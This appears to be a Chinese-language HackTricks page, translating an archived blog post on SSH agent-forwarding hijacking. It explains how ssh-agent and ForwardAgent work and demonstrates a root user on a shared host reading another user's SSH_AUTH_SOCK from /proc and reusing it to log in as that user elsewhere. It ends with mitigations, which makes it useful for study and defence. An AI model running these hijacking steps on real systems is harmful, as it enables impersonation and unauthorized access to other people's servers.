<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# 摘要

如果您在`/etc/ssh_config`或`$HOME/.ssh/config`配置文件中发现以下内容，您可以做什么：
```
ForwardAgent yes
```
如果您是机器内的root用户，您可能可以访问在/tmp目录中找到的任何代理生成的ssh连接

使用Bob的ssh-agent之一冒充Bob:
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## 为什么会生效？

当你设置变量 `SSH_AUTH_SOCK` 时，你正在访问 Bob 的密钥，这些密钥已经在 Bob 的 ssh 连接中使用过。然后，如果他的私钥仍然存在（通常会存在），你将能够使用它来访问任何主机。

由于私钥以未加密的方式保存在代理的内存中，我认为如果你是 Bob，但不知道私钥的密码，你仍然可以访问代理并使用它。

另一个选项是，代理的用户所有者和 root 用户可能能够访问代理的内存并提取私钥。

# 长说明和利用

**将此帖子作为已删除帖子的存档：** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **当无法信任 ForwardAgent 时**

无密码的 SSH 使得在类 Unix 操作系统上的生活变得更加轻松。如果您的网络需要链接的 ssh 会话链（例如，访问受限网络），代理转发变得非常有帮助。通过代理转发，我可以从我的笔记本电脑连接到开发服务器，然后从那里运行另一个服务器的 svn checkout，所有这些都不需要密码，同时保持我的私钥安全存储在本地工作站上。

然而，这可能是危险的。快速的网络搜索将会显示几篇文章指出，只有中间主机是可信的时，这才是安全的。然而，很少会找到解释为什么这是危险的。

这就是本文的目的。但首先，一些背景知识。

## **无密码身份验证的工作原理**

在正常模式下进行身份验证时，SSH 使用您的密码来证明您是您所说的那个人。服务器将此密码的哈希与其存档中的哈希进行比较，验证哈希是否匹配，然后让您进入。

如果攻击者能够破解用于保护密码的加密，他们可以窃取密码并随时以您的身份登录。如果攻击者被允许执行数十万次尝试，他们最终可以猜出您的密码。

一种更安全的身份验证方法是[公钥身份验证](http://www.ibm.com/developerworks/library/l-keyc/index.html)，一种无需密码登录的方式。公钥身份验证需要一对匹配的公钥和私钥。公钥加密消息，只能使用私钥解密。远程计算机使用您的公钥的副本来加密发送给您的秘密消息。您通过使用私钥解密消息并将消息发送回远程计算机来证明您是您。您的私钥在整个过程中始终安全地存储在本地计算机上，免受攻击。

私钥很有价值，必须受到保护，因此默认情况下以加密格式存储。不幸的是，这意味着在使用之前必须输入加密密码。许多文章建议使用无密码（未加密）私钥以避免这种不便。这是一个坏主意，因为任何可以访问您工作站的人（通过物理访问、盗窃或黑客攻击）现在也可以自由访问任何配置了您公钥的计算机。

OpenSSH 包括[ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)，一个在本地工作站上运行的守护程序。它将您的私钥的解密副本加载到内存中，因此您只需输入一次密码。然后，它提供一个本地[套接字](http://en.wikipedia.org/wiki/Unix\_domain\_socket)，ssh 客户端可以使用它来请求解密远程服务器发送回来的加密消息。您的私钥在 ssh-agent 进程的内存中安全地保留，同时允许您在不输入密码的情况下进行 ssh。

## **ForwardAgent 的工作原理**

许多任务需要“链接”ssh 会话。考虑我之前的示例：我从我的工作站 ssh 到开发服务器。在那里，我需要执行 svn 更新，使用“svn+ssh”协议。由于在共享服务器上留下一个未加密的超级秘密私钥副本是愚蠢的，现在我被困在密码身份验证中。但是，如果我在工作站的 ssh 配置中启用了“ForwardAgent”，ssh 将使用其内置的隧道功能在开发服务器上创建另一个套接字，该套接字被隧道返回到我本地工作站上的 ssh-agent 套接字。这意味着开发服务器上的 ssh 客户端现在可以直接向运行在我工作站上的 ssh-agent 发送“解密此秘密消息”的请求，向 svn 服务器进行身份验证，而无需访问我的私钥。

## **为什么这可能是危险的**

简而言之，任何具有中间服务器上的 root 权限的人都可以自由使用您的 ssh-agent 来对其他服务器进行身份验证。一个简单的演示展示了这可以多么轻松地实现。主机名和用户名已更改以保护无辜者。

我的笔记本电脑正在运行 ssh-agent，它通过套接字与 ssh 客户端程序通信。此套接字的路径存储在 SSH_AUTH_SOCK 环境变量中：
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
[ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)程序允许我们查看和与代理中的密钥进行交互：
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
我在我的笔记本电脑的\~/.ssh/config文件中设置了“ForwardAgent yes”。因此，ssh将创建一个连接本地套接字与远程服务器上的本地套接字的隧道：
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
即使我的密钥未安装在“seattle”上，ssh客户端程序仍然能够访问在我的本地机器上运行的代理：
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
那么...我们可以干扰谁呢？
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
我从来不喜欢鲍勃。要找到他的代理连接，我需要找到他一个ssh会话的子进程：
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)───bash(16817)

sshd(25296)───bash(25297)───vim(14308)
```
有几种方法可以让 root 查看运行进程的环境。在 Linux 上，数据可以在 /proc/<pid>/environ 中找到。由于数据是以 NULL 结尾的字符串存储的，我会使用 tr 命令将 NULL 转换为换行符：
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
我现在已经掌握了劫持Bob的ssh-agent所需的一切信息：
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
如果我有特定目标，现在应该能直接连接。否则，只需观察进程列表或在Bob的历史文件中进行搜索，就会发现很多机会目标。在这种情况下，我知道Bob在名为“boston”的服务器上存储了各种超级机密文件：
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
我已成功利用“seattle”上的root权限访问“boston”上的bob。我打赌我可以利用这一点让他被解雇。

## **保护自己！**

不要让你的ssh-agent无限期存储你的密钥。在OS X上，配置你的Keychain在不活动或屏幕锁定时锁定。在其他类Unix平台上，传递 -t 选项给ssh-agent，这样它的密钥将在 n 秒后被移除。

在连接到不受信任的主机时不要启用代理转发。幸运的是，\~/.ssh/config 语法使这变得相当简单：
```
Host trustworthyhost
ForwardAgent yes
```

```
Host *
ForwardAgent no
```
## **推荐阅读**

* [OpenSSH密钥管理](http://www.ibm.com/developerworks/library/l-keyc/index.html) – Daniel Robbins
* [Illustrated Guide to SSH Agent Forwarding](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) – Steve Friedl
* [ssh-agent手册](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [ssh-add手册](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
